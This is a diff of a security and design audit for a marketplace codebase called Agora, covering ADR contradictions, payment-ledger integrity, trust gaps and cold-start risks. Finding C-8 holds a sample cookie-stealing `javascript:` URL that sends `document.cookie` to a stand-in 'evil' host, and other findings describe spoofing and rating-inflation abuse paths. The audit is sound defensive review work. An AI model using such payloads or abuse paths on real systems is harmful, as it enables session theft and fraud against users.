@@ -1,12 +1,13 @@
-# Andromeda — design audit
+# Agora — design audit (post-rebrand)
 
-> **Historical note:** This audit was written under the project's
-> previous name. The codebase is now branded **Agora** (see ADR 0013).
-> Findings below are still applicable; only the brand changed.
-
-Independent paper review. No code changes. Reviewer had no prior context;
-findings are based on `README.md`, `PAYMYAGENT.md`, `docs/decisions/0001..0010`,
-`docs/BUILD-SUMMARY.md`, `CHANGELOG.md`, and a targeted read of the source.
+> Independent paper review. No code changes. No tests run. Reviewer
+> approached the codebase fresh, reading `README.md`, `PAYMYAGENT.md`,
+> ADRs 0001–0013, `docs/BUILD-SUMMARY.md`, and a targeted scan of the
+> sources. The project was renamed LUMEN → Andromeda → Agora; the
+> Andromeda audit at this same path is the prior version this one
+> overwrites. This audit looks at: (a) post-rebrand additions
+> (`dashboard/`, `web/`, ADR 0013 triple-aliasing), and (b) the original
+> findings — whether they hold, shift, or are addressed.
 
 ---
 
@@ -14,96 +15,164 @@ findings are based on `README.md`, `PAYMYAGENT.md`, `docs/decisions/0001..0010`,
 
 ### 1.1 ADR-vs-ADR contradictions
 
-**C-1. "No accounts, no email" vs. registry pubkey upsert.**
-ADR 0001 (Identity) declares: *"There are no email addresses, no passwords,
-no accounts. A keypair is generated on first run and persisted locally."*
-ADR 0004 says: *"`POST /v1/sellers/register` is upsert-by-pubkey. The seller
-signs the body so a stranger can't hijack a seller's row."* The registry
-schema (`registry/migrations/0001-initial.sql`) has `sellers.pubkey PRIMARY
-KEY` — i.e. the pubkey **is** the account. The contradiction is rhetorical:
-the project repeatedly markets itself as account-free, but the registry
-**is** an account system keyed by Ed25519 pubkey, with re-registration as a
-write-protected upsert. Honest re-framing: "the account is your pubkey."
+**C-1 (was, still). "No accounts, no email" vs. registry pubkey upsert.**
+ADR 0001 frames Agora as account-free; ADR 0004 + the schema make the
+Ed25519 pubkey *the* account (PRIMARY KEY in `sellers`, signed upsert
+write-protection). The rhetorical contradiction is unchanged. ADR 0013
+did not amend the framing.
 
-**C-2. ADR 0010 §"Reviewer assignment is BLIND" vs. its own footnote.**
-The decision says assignment is *blind*, but step 3 admits: *"the seller's
-pubkey is not directly hidden (it's discoverable from the service_id)."* The
-implementation in `registry/src/lib/reviews.ts::pickRandomReviewer` confirms
-the reviewer can derive the subject's pubkey trivially because
-`review_requests.subject_pubkey` is stored alongside and the same row is
-returned to the reviewer via `/reviews/assigned`. **This is at best
-"pseudo-blind"**, not blind in the cryptographic sense the ADR's title
-suggests.
+**C-2 (was, still). "Blind" reviewer assignment is not blind.**
+`registry/src/lib/reviews.ts::pickRandomReviewer` returns the row with
+`subject_pubkey` to the reviewer via `getReviewerAssignments`. The
+reviewer trivially derives the seller. No commit-reveal, no `seed`
+column, no transcript. ADR 0010 still markets this as a primitive. No
+change.
 
-**C-3. ADR 0008 mock-mode dataset description.** ADR 0008 says the dataset
-is *"~200 MB Parquet"* and *"a small JSON fixture (~20 KB) representing a
-stand-in"*. `agents/dataset-seller/src/server.js` always serves the JSON
-fixture even in real mode — the only "real-mode" branch in the code is
-`/api/dev/pay` being disabled. There is no Parquet, no env-pointed file
-loader. Implementation drift: the "real-mode" path the ADR promises does
-not exist.
+**C-3 (was, still). Real-mode dataset path doesn't exist.**
+`agents/dataset-seller/src/server.js` still serves the JSON fixture
+unconditionally. ADR 0008's "actual file lives on disk (configured via
+env)" remains vapor. No change.
 
-**C-4. ADR 0010 silent re-review vs. dispute path.** ADR 0010 §"Two-sided
-slashing" specifies *"silent re-review (5–10% sampled) with rubric scores
-deviating > 2.0 from the consensus get -50 honor."* The actual code
-(`registry/src/app/api/v1/reviews/[id]/dispute/route.ts`) slashes the
-reviewer **on any well-formed dispute call signed by anyone** — it does not
-verify the disputer is the buyer-of-record, does not run silent re-review,
-and does not compute deviation. Build-summary §6.5 admits this honestly,
-but the ADR is not amended; the contradiction stands in the design record.
+**C-4 (was, still). Dispute path slashes on the disputer's say-so.**
+`/api/v1/reviews/[id]/dispute/route.ts` calls `slashReviewer` with
+`evidence: json.evidence ?? {}` and never verifies (a) the disputer is a
+buyer-of-record, (b) the evidence is well-formed, (c) silent re-review
+deviation. ADR 0010 §"Two-sided slashing" is unimplemented as written.
+No change.
 
-**C-5. ADR 0001 §"Tx recording is signed by the SELLER".** ADR 0004 says
-the seller signs because the seller knows the payment_hash. But
-`recordTransaction` is idempotent only on `payment_hash` UNIQUE — the
-seller can fabricate `buyer_pubkey` at will (the buyer never signs). ADR
-0001's "buyer's identity is just a pubkey field in the body" is honest, but
-this means **honor accrual is computed from a list the seller wrote
-unilaterally**. See trust matrix below.
+**C-5 (was, still). Tx record is seller-signed; buyer field is unsigned.**
+`registry/src/app/api/v1/transactions/record/route.ts` still verifies
+only `auth.pubkey === seller_pubkey`; `buyer_pubkey` is whatever the
+seller posts. No change.
+
+**C-6 (NEW, post-ADR 0013). The verifier "accepts three header families"
+claim is contradicted by the registry's own gate.**
+`registry/src/lib/sig.ts::verifySignedRequest` performs a manual
+pre-check:
+
+```ts
+if (!headers[HDR_PUBKEY] || !headers[HDR_SIG] || !headers[HDR_TIMESTAMP])
+  return { ok: false, status: 401, reason: "missing signature headers" };
+```
+
+`HDR_PUBKEY` etc. resolve to the canonical `x-agora-*` constants only.
+A request with `x-andromeda-*` or `x-lumen-*` headers (the legacy
+families ADR 0013 promises to accept) is rejected with 401 *before*
+`verifyRequest` (which DOES iterate all three families) is ever called.
+
+The phase-1b regression test (`scripts/test-phase1b.js:123`) injects a
+tampered `x-andromeda-*` set and asserts 401 — but it is the wrong 401
+("missing signature headers" instead of "signature invalid"). The test
+shape passes either way, so neither the design nor the test detect the
+bug. **The "registry accepts the legacy header family" half of ADR 0013
+is unimplemented.**
+
+The provider's *naked* buyer-attribution headers (the
+`x-agora-pubkey ?? x-andromeda-pubkey ?? x-lumen-pubkey` fallback chain
+in `provider/src/app/api/v1/listing-verify/route.ts:38-41`) DO accept
+all three names — but those are unauthenticated to begin with (S3
+below), so this isn't a guarded path.
+
+**C-7 (NEW, ADR 0011). Dashboard kill-switch isn't enforced on registry
+proxy endpoints.**
+ADR 0011 §3 (third bullet) says: *"When the kill-switch is on, the
+control plane can refuse to proxy registry calls (future work) so the
+human's 'halt' actually halts the dashboard's external chatter."* The
+current `mcp/control-plane.js` handler enforces kill-switch only inside
+`budget.js::reserve()`, which is called by paid MCP tools. The five new
+proxy endpoints (`/balance`, `/transactions`, `/subscriptions`,
+`/subscriptions/:id/cancel`, `/sellers`) do not check
+`getKillSwitch()`. The dashboard UI tells users *"When ON, every paid
+MCP tool refuses with `kill_switch_active`"* (`Allowance.tsx:96`),
+which is technically true — but the MCP HTTP proxy that the dashboard
+itself talks through happily continues to make outbound calls (and the
+SPA continues to issue them), which contradicts the ADR's stated goal
+("halts the dashboard's external chatter"). The "future work"
+admission is honest at the ADR level; the UI copy isn't.
+
+Notably, `POST /subscriptions/:id/cancel` — a *write* — is also gated
+by neither kill-switch nor budget. A compromised dashboard origin (see
+S5 below) can cancel any subscription whose ID it knows.
+
+**C-8 (NEW, ADR 0012). Seller URL is rendered into `<a href>` without
+scheme validation.**
+The web index renders `seller.url` from the registry directly into
+`href` attributes (`web/src/app/sellers/[pubkey]/page.tsx:51-58`,
+`web/src/app/services/[id]/page.tsx:93-100`). No scheme allowlist, no
+URL parsing, no sanitization. Registration accepts any string —
+`registry/src/app/api/v1/sellers/register/route.ts:33-38` only checks
+truthiness. A malicious seller can register `url:
+"javascript:fetch('//evil/'+document.cookie)"`. React escapes the body
+text by default (so `<script>` in `description` is inert), but
+`href="javascript:..."` is not auto-blocked by JSX prior to React 19's
+`react-dom` URL sanitizer landing universally — and even where blocked,
+`<a target="_blank" rel="noopener">` does not protect against scheme
+poisoning. The ADR 0012 trust-boundary discussion does not mention
+this; the audit prompt asked specifically about it.
+
+The same registration path also accepts arbitrary HTML in
+`description` and `name`. They render as inert text via JSX, so no
+direct XSS — but if any future surface re-renders these via
+`dangerouslySetInnerHTML` (e.g. an OG-image generator, a feed, an
+RSS), the input is unsanitized at the source.
 
 ### 1.2 Code decisions absent from any ADR
 
-- **D-1. Service-id format.** `${seller_pubkey.slice(0,8)}:${local_id}` is
-  hardcoded in `registry/src/lib/db.ts`. Truncation to 8 hex chars (32
-  bits of entropy) raises a small but real collision surface for service
-  IDs across 2^16 sellers (birthday). No ADR.
-- **D-2. Macaroon HMAC scope.** Only `payment_hash`, `resource`, `amount`,
-  `exp` are bound. There is no buyer pubkey caveat, no per-issuance nonce,
-  and no `audience` claim. A leaked macaroon+preimage replays anywhere
-  until `exp`. No ADR.
-- **D-3. `slashReviewer` writes a fake seller row.** When slashed, if the
-  reviewer is not yet a seller, `INSERT INTO sellers (... name='(slashed
-  reviewer)' url='' ...)` is forced. This silently registers a "seller" row
-  with an empty URL just to hold the negative honor. No ADR; surfaces as a
-  ghost seller in `GET /v1/sellers`.
-- **D-4. `ANDROMEDA_REGISTRY_SECRET` fallback chain.** Dispute slashing
-  signs evidence with `ANDROMEDA_REGISTRY_SECRET ?? L402_SECRET ??
-  "registry-default-secret-please-set-something-stronger"` — the literal
-  default is shipped as a string, which makes audit-log signatures
-  unfalsifiable on any default deployment. No ADR.
-- **D-5. `andromeda_purchase_dataset` requires the seller to expose
-  `/api/dev/pay`.** Look at `mcp/server.js:651`: in mock mode the MCP just
-  POSTs to the seller's `/api/dev/pay`. ADR 0008 implies a generic
-  L402 flow, but the implementation has hard knowledge of a per-seller
-  mock-pay endpoint. No ADR; coupling not documented.
-- **D-6. Dataset-seller's `recordTx` uses `buyer_pubkey ?? "unknown"`.**
-  Buyer attribution is best-effort via the optional `X-Andromeda-Pubkey`
-  header, which the dataset-seller does **not** verify with a signature.
-  An attacker who knows another buyer's pubkey can forge attribution. No
-  ADR.
+(All from the prior audit unchanged unless noted.)
 
-### 1.3 Architecture diagram vs. reality
+- **D-1.** `service-id = pubkey[:8] + ":" + local_id` — 32-bit prefix,
+  birthday-collision risk. No ADR. (`registry/src/lib/db.ts:101`)
+- **D-2.** Macaroon HMAC binds only `payment_hash`/`resource`/`amount`/
+  `exp` — no buyer pubkey caveat, no nonce. No ADR.
+- **D-3.** `slashReviewer` writes a ghost seller row when the slashed
+  reviewer doesn't exist as a seller. Ghost rows surface in
+  `GET /v1/sellers`. (`registry/src/lib/reviews.ts:142-146`)
+- **D-4.** Dispute audit log HMAC default secret literal:
+  `"registry-default-secret-please-set-something-stronger"` is committed
+  in the source as fallback (`reviews/[id]/dispute/route.ts:23`).
+  Default deployments → unfalsifiable audit signatures.
+- **D-5.** `agora_purchase_dataset` couples to a per-seller
+  `/api/dev/pay` endpoint. No ADR.
+- **D-6.** Dataset-seller and provider both record tx with
+  `buyer_pubkey ?? null` from an unauthenticated header. (Now
+  three-way: `x-agora-* ?? x-andromeda-* ?? x-lumen-*`.)
+- **D-7 (NEW).** Dashboard SPA persists the bearer token in
+  `localStorage` (`dashboard/src/lib/controlPlane.ts:9-46`). Any
+  XSS in the SPA — or any future browser-extension privilege
+  problem — leaks the control-plane token, which has full kill-switch
+  authority and can cancel subscriptions. ADR 0011 doesn't discuss
+  this.
+- **D-8 (NEW).** The control-plane CORS allow-list reads
+  `AGORA_DASHBOARD_ORIGINS ?? ANDROMEDA_DASHBOARD_ORIGINS ??
+  LUMEN_DASHBOARD_ORIGINS` and defaults to `http://localhost:5173`. No
+  ADR mentions the env override; there is no allow-list for `origins:
+  ""` (file: scheme); a Tauri shell would need to add
+  `tauri://localhost` (the ADR foreshadows this but does not pin a
+  date or name a single source of truth).
+- **D-9 (NEW).** Triple-aliasing means the *naked* attribution header
+  resolution chain on each paid-endpoint widens from one acceptable
+  header (Andromeda era) to three (post-ADR 0013). Header-confusion
+  surface for buyer attribution grew; nothing in ADR 0013 frames this
+  as a trade-off. (See S3.)
 
-ADR 0001's diagram shows a Tauri Dashboard at the bottom. **No Tauri shell
-exists.** `dashboard/src/` contains two CLI shims (`control-plane-cli.js`,
-`tauri-build-stub.js`). ADR 0006 admits the deferral, but ADR 0001's
-diagram is not annotated to reflect "shell deferred." A naïve reader of
-ADR 0001 will assume a GUI exists.
+### 1.3 Architecture-vs-reality drift
 
-The diagram also collapses every seller (provider, monitor, dataset) into
-the registry's HTTP path; in reality the registry is read-only for buyers
-and the buyer-side MCP holds session state. The diagram does not show that
-the MCP's localhost control plane is the only writeable surface a human
-touches — a load-bearing detail.
+ADR 0001's diagram still shows a "Tauri Dashboard" at the bottom. ADR
+0006 / 0011 say: SPA-first, Tauri optional, Tauri shell deferred until
+`cargo` is available. The implementation aligns with the ADR-0011
+position — Vite SPA in `dashboard/`, Tauri-stub script that no-ops on
+machines without Rust. The ADR-0001 diagram is still not annotated; a
+new reader looking only at ADR 0001 will infer a Tauri app exists.
+
+Public web index (`web/`): the architecture promotes a fourth Next.js
+surface (after provider/registry/market-monitor — well, market-monitor
+is Express). ADR 0012 doesn't mention that the web app issues
+*server-side* `fetch()` to the registry without any signed-request
+flow, which is correct for read-only access but means the web app is
+fully trusted by the registry to make the right read-only choices —
+i.e. the trust boundary the ADR claims (read-only, server-side) is
+real but undefended-in-depth: a misconfigured deployment could expose
+the registry's port directly to clients, defeating the boundary.
 
 ---
 
@@ -111,42 +180,56 @@ touches — a load-bearing detail.
 
 ### 2.1 Built-but-not-claimed (silent additions)
 
-| Endpoint / behavior                                  | Stated where? |
-|------------------------------------------------------|---------------|
-| `POST /api/v1/admin/fast-forward`                    | Build-summary only; no ADR |
-| `POST /api/dev/tick` on market-monitor               | Build-summary only |
-| Heartbeat 60s self-re-register                       | ADR 0004 footnote (not in 0001) |
-| Reviewer ghost-seller insert (D-3)                   | Nowhere |
-| Service-id 8-hex-prefix collision surface            | Nowhere |
-| FTS5 query token sanitization                        | Nowhere |
+| Endpoint / behaviour                                       | Stated where? |
+|------------------------------------------------------------|---------------|
+| `POST /api/v1/admin/fast-forward`                          | Build-summary only |
+| `POST /api/dev/tick` (market-monitor)                      | Build-summary only |
+| Heartbeat 60s self-re-register                             | ADR 0004 footnote |
+| Reviewer ghost-seller insert (D-3)                         | Nowhere |
+| Service-id 8-hex prefix collision surface                  | Nowhere |
+| FTS5 query token sanitization (raw `q` → SQLite FTS5)      | Nowhere |
+| **Dashboard SPA → control-plane proxy → registry path**    | ADR 0011 §3 (well-stated) |
+| **Web index → registry direct fetch**                      | ADR 0012 (well-stated) |
+| **Triple-aliasing on naked attribution header**            | ADR 0013 §"naked header" line — but trade-offs absent |
+| Dashboard `localStorage` bearer-token persistence          | Nowhere |
+| Web app's `<a href={seller.url}>` rendering                | Nowhere |
 
 ### 2.2 Claimed-but-missing or partial
 
-| Claimed in                                       | Reality |
-|--------------------------------------------------|---------|
-| ADR 0001: "fire-and-forget tx record … must not break the response if registry is down" | Implemented for provider; dataset-seller and market-monitor implement it inline (D-6) without retries or local queue. A registry outage during a paid flow loses tx records permanently. |
-| ADR 0008: "actual file lives on disk (configured via env)" (real mode)         | Not implemented; fixture serves in both modes (C-3). |
-| ADR 0010: silent re-review sampling                 | Not implemented (C-4). |
-| ADR 0010: buyer-side fraud slashing                 | Not implemented (build-summary §6.4 admits). |
-| ADR 0010: "a passing review (rollup ≥3) flips a per-service 'peer-reviewed' badge" | Implemented as **per-seller** badge, not per-service (`sellerBadges()` aggregates across all of a seller's services). |
-| ADR 0005: Real-mode subscribe deposit via L402      | Not implemented (build-summary §3 admits "trust-deposit"). |
-| ADR 0005: Cancel-refund in real mode                | Not implemented (build-summary §7 admits). |
-| ADR 0008: Two-step Lightning settlement to platform | Counter only; no NWC payout (build-summary §6 admits). |
-| README "MCP control plane … `/events` (SSE)"         | Listed in `docs/BUILD-SUMMARY.md` endpoint table but not exercised by `test-phase3.js`. Could be a stub. |
+(Same as previous audit, plus rebrand-era claims.)
+
+| Claimed in                                                  | Reality |
+|-------------------------------------------------------------|---------|
+| ADR 0008: "actual file lives on disk (configured via env)"  | Not implemented (C-3). |
+| ADR 0010: silent re-review sampling                         | Not implemented. |
+| ADR 0010: buyer-side fraud slashing                         | Not implemented. |
+| ADR 0010: per-service "peer-reviewed" badge                 | Implemented as per-seller. |
+| ADR 0005: real-mode subscribe deposit via L402              | Not implemented. |
+| ADR 0005: cancel-refund in real mode                        | Not implemented. |
+| ADR 0008: two-step Lightning settlement to platform         | Counter only. |
+| ADR 0011 §3: "kill-switch refuses to proxy registry calls"  | Not implemented (C-7). UI copy implies it is. |
+| ADR 0013: "verifier accepts EITHER family on incoming"      | Half-implemented for signed writes (C-6). Pre-gate rejects `x-andromeda-*` and `x-lumen-*` requests as "missing signature headers" before `verifyRequest` is consulted. |
+| ADR 0012: read-only public index                            | True (no write paths) — but `seller.url` injection vector is ignored in trust-boundary writeup (C-8). |
+| Phase 7 "robots permissive, sitemap dynamic"                | Implemented. |
 
 ### 2.3 Test-script coverage gaps per phase
 
-| Phase | Stated deliverable | Test verifies? |
-|-------|-------------------|----------------|
-| 1 (registry) | Multi-seller catalog, signed writes, tx ledger | YES — but does not verify rejection of seller spoofing the buyer_pubkey field on `/transactions/record` |
-| 2 (subscriptions) | Polling delivery, sat-per-event, top-up, cancel, balance_exhausted, signed alerts | Mostly YES — but "alert delivery is signed by the seller (HMAC over the alert body)" (ADR 0005) is checked only by `length >= 40`, not by re-computing the HMAC |
-| 3 (control plane) | Headless control plane, kill-switch, deferred GUI | YES — but `/events` SSE endpoint listed in build-summary is not exercised |
-| 4 (orchestrator) | Embeddings, ranking 60/20/20, explainable | YES |
-| 5 (peer review) | Honor, blind assignment, slashing, decay, peer_reviewed badge | PARTIAL — peer_reviewed badge assertion has a fall-through "skipped — known limitation" branch (test-phase5.js:208) that lets the test pass without ever confirming the badge appears |
-| 5 | "blind assignment" | NOT verified blind — the test confirms reviewer ≠ requester pubkey; it does not test that the reviewer cannot derive the subject pubkey |
-| 5 | "tx within 30 days" gate on rate | YES (positive case only — not tested with a >30-day-old or absent tx) |
-| 5 | Slashing requires verifiable evidence | NO — test passes with `evidence: { test: true }` and `reason: "fraudulent ratings (test)"` |
-| 6 (dataset) | Platform fee = 2%, signed URL 24h | YES for fee; signed URL exp is reported but not validated against tampering |
+Largely unchanged from the prior audit. Newly notable:
+
+- `scripts/test-phase1b.js` asserts `x-andromeda-*` tampered → 401 but
+  doesn't distinguish "signature invalid" from "missing signature
+  headers" — masks C-6.
+- `scripts/test-phase3-ui.js` (per BUILD-SUMMARY) verifies CORS
+  preflight from `evil.com` is rejected and that endpoint paths appear
+  in the bundle string — it does not assert that the kill-switch
+  refuses to proxy `/sellers` or cancel a subscription. So C-7 is
+  un-tested.
+- The web index test (`scripts/test-phase7.js`) is described as "7
+  pages, sitemap, robots." Whether it tests `<a href=javascript:...>`
+  rejection or `description` HTML escaping is unclear from the
+  build-summary alone; the page code suggests **no scheme validation
+  exists at all**, so any such test would either skip the case or
+  assert the broken behaviour. (Uncovered — see C-8.)
 
 ---
 
@@ -163,263 +246,237 @@ buyer_wallet ── 240 sat (Lightning) ──► provider_wallet
                                           ▼
                             registry: transactions.record
                                   amount_sats=240
-                                  platform_fee_sats=5  (rounded 2%)
+                                  platform_fee_sats=5  (rounded 2%, seller-set)
                             (NO money moves to platform — counter only)
 ```
 
-**Hops where money could be lost / double-counted:**
+Hops where money / integrity can be lost:
 
-- L1. Macaroon issued before settlement check; in mock the preimage is
-  deterministic; in real, `verifyAuth` calls `lookupInvoice`. If the wallet
-  reports `settled=true` but the bolt-11 was paid by someone other than
-  the L402 caller, the holder of the macaroon+preimage is granted access —
-  L402 doesn't bind invoice payer to macaroon holder. **Lost integrity,
-  not lost sats.**
-- L2. `recordTxFireAndForget` uses `txId = "tx_" + payment_hash[:24]`
-  truncated. Collisions across providers possible (same payment_hash
-  prefix on two settled invoices). `payment_hash UNIQUE` constraint will
-  reject the second; **fee on second is silently dropped from the ledger.**
-- L3. `platform_fee_sats` is set by the **seller** in the signed tx
-  record. The seller can set it to 0 with no consequence — the registry
-  doesn't recompute it server-side (`recordTransaction` honors whatever
-  the seller posts, defaulting to 0). **Platform revenue is on the honor
-  system.**
-- L4. No two-step settlement: the platform never receives sats. The 2%
-  is a fictional accounting line until ADR 0008 §"Two-step settlement"
-  is implemented. The seller keeps 100% of the gross.
+- **L1.** L402 macaroon-bound to `payment_hash` only — if any third
+  party pays the bolt-11, the macaroon-holder still gets access.
+- **L2.** `txId = "tx_" + payment_hash[:24]` — across providers,
+  prefix collisions could occur; UNIQUE constraint silently drops the
+  second.
+- **L3.** `platform_fee_sats` is set by the seller in the signed body
+  — the registry doesn't recompute. Fee can be 0 with no consequence.
+- **L4.** No two-step settlement; platform never sees sats.
+- **L5 (post-rebrand).** Buyer attribution header now resolves
+  `x-agora-pubkey ?? x-andromeda-pubkey ?? x-lumen-pubkey`. An
+  off-protocol attacker who sends an L402-paid call with
+  `x-lumen-pubkey: <victim>` will write `<victim>` into the registry
+  ledger as the buyer of that tx — gaming `rateSeller`'s 30-day-tx
+  gate (S3 below) for any victim pubkey, not just the attacker's own.
 
-### 3.2 Dataset purchase with peer review (5000 sat)
+### 3.2 Dataset purchase + peer review
 
-```
-buyer_wallet ── 5000 sat ──► dataset_seller_wallet     (L402 settle)
-                                  │
-                       fire-and-forget tx record
-                                  ▼
-                         registry: amount_sats=5000
-                                   platform_fee=100  (counter only)
+Identical flow to before. `escrow_sats` is fictitious (no payment
+proof), `reviewer_payout_sats` is returned in JSON but no
+`reviewer_owed` ledger column exists, slashing escrow clawback is a
+JSON field with no balance write. No change.
 
-[later, seller requests peer review]
-seller (escrow_sats=N) ──► review_requests row (escrow held in registry)
-                                  │
-                  blind-assigned reviewer submits rubric
-                                  ▼
-                 reviewer.owed += N * 0.95   (LEDGER ENTRY ONLY)
-                 platform.owed += N * 0.05   (LEDGER ENTRY ONLY)
-                 seller.honor  += rollup * 2
+### 3.3 Honor inflation via repeated `rateSeller`
 
-[NB: escrow_sats is a number on the row; no Lightning payment was actually
- collected. The "escrow" is purely declarative.]
-```
-
-**Loss / double-count surfaces:**
-
-- D1. **Escrow is fictitious in v0.** `requestReview` accepts any
-  `escrow_sats` integer with no payment proof. The seller can claim 1
-  satoshi and the reviewer "earns" 95% of nothing; or claim 1B and inflate
-  the platform-fee counter. There is no validation. **The economic claim
-  fails the moat test — see §6.**
-- D2. **Reviewer payout is never paid.** `submitReview` returns
-  `reviewer_payout_sats` in the JSON response, but no DB column tracks
-  reviewer balances. There is no `reviewer_owed` table. The reviewer has
-  no way to claim sats. **Money "credited" goes nowhere.**
-- D3. **Slashing escrow clawback is also fictitious.** `slashReviewer`
-  returns `escrow_returned: req.escrow_sats` in the response but does not
-  actually update any balance row, does not refund any Lightning invoice.
-  ADR 0010 admits this in mock mode but the test asserts the number, not
-  the payment — false sense of completeness.
-- D4. **Buyer's `rate_seller` honor delta has no escrow at all** — it
-  ships free of payment, so honor inflation by a single buyer who pays
-  240 sat once and rates 5★ repeatedly is bounded only by the "30 day"
-  cooldown (which is per-call, not per-month). The 30-day check accepts
-  any tx; nothing prevents `rateSeller` from being called once per second
-  with the same buyer-seller pair. **`UPDATE sellers SET honor = honor +
-  ?` has no per-buyer-per-seller uniqueness.** Honor is unbounded.
-
-### 3.3 Paid verification request (review escrow flow)
-
-```
-seller ─── signed POST /reviews/request {escrow_sats: N} ───► registry
-                                                                │
-                                       (no money. just a row.)
-                                                                ▼
-                                              random reviewer assigned
-```
-
-There is no Lightning hop. ADR 0010 §"Escrow + platform cut" admits *"in
-v0 mock mode this is a counter only."* Any economic claim about reviewer
-honesty incentives (D2, D3) is therefore decorative until a future
-"settlement layer" is built. The audit log entry is HMAC-signed with a
-default secret string (D-4) that is committed to the codebase as the
-fallback — **on a default deployment the slashing audit log is not
-cryptographically meaningful.**
+Unchanged. `UPDATE sellers SET honor = honor + ?` runs on every call.
+No (buyer, seller) UNIQUE index, no per-tx binding. **One 240-sat
+purchase + a rate loop = ±2 honor per request, unbounded.** This
+remains the highest-severity finding.
 
 ---
 
-## 4. Trust model matrix
+## 4. Trust-model matrix
 
-| Privileged action            | Triggered by       | Verification             | Publicly auditable? |
-|------------------------------|--------------------|--------------------------|---------------------|
-| Seller registration / upsert | Seller             | Ed25519 sig, 5-min ts    | YES (`GET /sellers`) |
-| Service catalog write        | Seller (signed)    | Ed25519 sig              | YES |
-| Tx record                    | Seller (signed)    | Sig matches `seller_pubkey` only — buyer field is unverified | PARTIAL — buyer_pubkey is unauthenticated |
-| `platform_fee_sats` value    | Seller (signed)    | NONE (server trusts the number) | NO — fee can be 0; no recomputation |
-| Buyer rating (`/rate`)       | Buyer (signed)     | Verifies a tx exists in last 30d, but not that this is the first rating, and not the integrity of the underlying tx (D-1) | PARTIAL |
-| Review request               | Seller (signed)    | Sig only — no escrow proof of payment | NO |
-| Reviewer availability        | Reviewer (signed)  | Ed25519 sig              | YES (joined view) |
-| Review submission            | Reviewer (signed)  | Sig + rubric validation  | YES |
-| Slashing / dispute           | **Anyone with a valid Ed25519 keypair** | Sig only; no buyer-of-record check, no silent re-review | YES (event row) but evidence is whatever the disputer posts; HMAC uses a default secret if env unset (D-4) |
-| Honor decay                  | Lazy on `GET /sellers/:pubkey` OR admin-secret POST | None server-side beyond `decay_runs` self-coordination | YES (decay_runs row) |
-| Reviewer assignment (random) | Seller's `request_review` triggers it | Server picks weighted-random; client is told the outcome — **no commit-reveal**, **no transcript** | NO — the registry could secretly always pick the requester's chosen reviewer; nothing publishes the random seed |
-| Honor delta per rating       | Buyer | None — unlimited per buyer-seller pair (no UNIQUE index) | NO |
-| Admin endpoints (decay, fast-forward, revenue) | Holder of `ADMIN_SECRET` (default `"dev-admin-secret"`) | Plain header check | NO — no audit log; no rate-limit; default secret is documented |
+| Privileged action                                | Triggered by                                           | Verification                                                                                                | Publicly auditable? |
+|--------------------------------------------------|--------------------------------------------------------|-------------------------------------------------------------------------------------------------------------|---------------------|
+| Seller registration / upsert                     | Seller (signed)                                        | Ed25519 sig (Agora family pre-check; legacy families silently rejected — C-6)                               | YES |
+| Service catalog write                            | Seller (signed)                                        | Ed25519 sig                                                                                                 | YES |
+| Tx record                                        | Seller (signed) — buyer_pubkey unsigned                | Sig matches `seller_pubkey` only                                                                            | PARTIAL |
+| `platform_fee_sats` value                        | Seller (signed)                                        | NONE — server stores whatever number                                                                        | NO |
+| Buyer rating (`/rate`)                           | Buyer (signed)                                         | 30-day tx exists — but tx-buyer field is forgeable (S3) and per-(buyer,seller) uniqueness absent (S1)        | PARTIAL |
+| Review request                                   | Seller (signed)                                        | Sig only — no escrow proof of payment                                                                       | NO |
+| Reviewer availability                            | Reviewer (signed)                                      | Ed25519 sig                                                                                                 | YES |
+| Review submission                                | Reviewer (signed)                                      | Sig + rubric validation                                                                                     | YES |
+| Slashing / dispute                               | Anyone with a valid Ed25519 keypair                    | Sig only; no buyer-of-record check; HMAC default-secret fallback (D-4)                                      | YES (event row, but evidence is whatever the disputer posts) |
+| Honor decay                                      | Lazy on `GET /sellers/:pubkey` OR admin-secret POST    | None server-side beyond `decay_runs` self-coordination                                                      | YES (decay_runs row) |
+| Reviewer assignment ("random-weighted")          | Seller's `request_review`                              | Server picks; no commit-reveal, no published seed                                                            | NO |
+| Honor delta per rating                           | Buyer                                                  | None — unbounded per (buyer, seller)                                                                        | NO |
+| Admin endpoints                                  | Holder of `ADMIN_SECRET` (default `"dev-admin-secret"`)| Plain header check                                                                                          | NO |
+| **Kill-switch on dashboard SPA flow**            | Holder of control-plane bearer token                   | Bearer auth; CORS allow-list `localhost:5173` only                                                          | YES (control plane logs) |
+| **Cancel subscription via control plane proxy**  | Holder of control-plane bearer token                   | Bearer auth ONLY; not gated by kill-switch (C-7) or budget                                                  | NO (no audit log on cancel) |
+| **Sellers list (public web index)**              | Anyone hitting `GET /api/v1/sellers`                   | None — public read                                                                                          | YES |
+| **`<a href={seller.url}>`** (web index)          | Visitor click                                          | None — registry returns whatever `url` was registered (C-8); web app does not validate scheme              | NO |
 
-**Privileged actions the registry can do that are not publicly auditable:**
+Privileged actions the registry/control-plane can do that are not publicly auditable: the prior audit's A1–A5 stand. Add:
 
-- **A1.** Pick a non-random reviewer (no commit-reveal of randomness).
-- **A2.** Mutate `sellers.honor` directly via SQL bypass (no append-only
-  honor log; the only audit log is `slashing_events`, and that's only
-  written by the `slashReviewer` path).
-- **A3.** Drop tx records (`recordTransaction` is `INSERT OR IGNORE`;
-  nothing publishes a Merkle root or signed snapshot).
-- **A4.** Edit any field of any row (single SQLite file).
-- **A5.** Run `forceRunDecay()` arbitrarily often (idempotent within 24h
-  is **only** enforced through `maybeRunDecay`; `forceRunDecay` has no
-  cooldown and is reachable via `POST /admin/decay?force=1`).
+- **A6 (NEW).** Control-plane operator (anyone holding the bearer
+  token) can cancel any local subscription without an audit log
+  entry.
+- **A7 (NEW).** Web index could be replaced or rerouted to a
+  different registry without any signed integrity check (the URL is
+  just an env var).
 
 ---
 
 ## 5. Cold-start risk register
 
-| Feature                               | Liquidity required  | N=0 / N=1 behavior |
-|---------------------------------------|---------------------|-------------------|
-| Orchestrator `recommend`              | ≥1 service          | N=0: returns empty `results`. N=1: still ranks, max_honor=1 forced; `intent_match` dominates trivially. Acceptable. |
-| Search (`/services/search`)           | ≥1 service          | N=0: empty list. OK. |
-| Honor ranking                         | ≥1 honor signal     | All sellers start at 0 → `maxHonor = max(1, ...)` returns 1 → `honor_normalized` is identically 0 for every seller until someone gets rated. Effectively dead weight in v0 (the 20% honor factor is meaningless on a fresh registry). |
-| Peer review                           | ≥1 reviewer ≠ requester | N=0 reviewers: `requestReview` returns `{ ok:false, reason:"no reviewers available" }`. N=1 (=requester): same. N=2 with weighted-random: blind in name only (only one option). The "weighted random" is meaningless at N=2. |
